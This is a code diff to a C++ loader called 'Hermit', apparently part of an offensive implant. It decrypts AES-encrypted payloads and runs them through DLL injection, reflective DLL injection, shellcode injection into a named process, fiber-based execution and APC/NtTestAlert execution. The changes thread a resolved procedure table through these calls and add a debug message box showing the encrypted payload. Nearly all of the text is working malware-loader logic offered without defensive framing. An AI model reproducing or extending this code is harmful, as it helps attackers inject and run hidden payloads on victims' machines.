@@ -24,7 +24,7 @@ namespace Hermit
 		// pState->pTeb 				        = NtCurrentTeb();
 		pState->hNTDLL				        = hNTDLL;
 		pState->hWinHTTPDLL			        = hWinHTTPDLL;
-		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hWinHTTPDLL);
+		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hWinHTTPDLL, FALSE);
 		// pState->pSyscalls			        = Syscalls::FindSyscalls(hNTDLL);
 		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
 		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
@@ -92,11 +92,11 @@ namespace Hermit
         if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
         {
             dwPID = System::Process::GetProcessIdByName(pState->lpPayloadProcessToInject);
-            Technique::Injection::DLLInjection(dwPID, (LPVOID)dllPath.c_str(), dwDllPathSize);
+            Technique::Injection::DLLInjection(pState->pProcs, dwPID, (LPVOID)dllPath.c_str(), dwDllPathSize);
         }
         else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
         {
-            Technique::Injection::ReflectiveDLLInjection(dllPath.c_str(), dwDllPathSize);
+            Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dllPath.c_str(), dwDllPathSize);
         }
 
         State::Free(pState);
@@ -138,7 +138,7 @@ namespace Hermit
         // Execute
         if (wcscmp(pState->lpPayloadTechnique, L"direct-execution") == 0)
         {
-            System::Process::ExecuteFile(execPath);
+            System::Process::ExecuteFile(pState->pProcs, execPath);
         }
 
         State::Free(pState);
@@ -183,6 +183,8 @@ namespace Hermit
             return;
         }
 
+        Stdout::DisplayMessageBoxW(wEnc.c_str(), L"ShellcodeLoader wEnc");
+
         // Decrypt the data
         std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pState->pCrypt->pAES->hKey, pState->pCrypt->pAES->iv);
 
@@ -193,15 +195,15 @@ namespace Hermit
         if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
         {
             dwPID = System::Process::GetProcessIdByName(pState->lpPayloadProcessToInject);
-            Technique::Injection::ShellcodeInjection(dwPID, bytes);
+            Technique::Injection::ShellcodeInjection(pState->pProcs, dwPID, bytes);
         }
         else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-fibers") == 0)
         {
-            Technique::Injection::ShellcodeExecutionViaFibers(bytes);
+            Technique::Injection::ShellcodeExecutionViaFibers(pState->pProcs, bytes);
         }
         else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-apc-and-nttestalert") == 0)
         {
-            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(bytes);
+            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(pState->pProcs, bytes);
         }
 
         State::Free(pState);
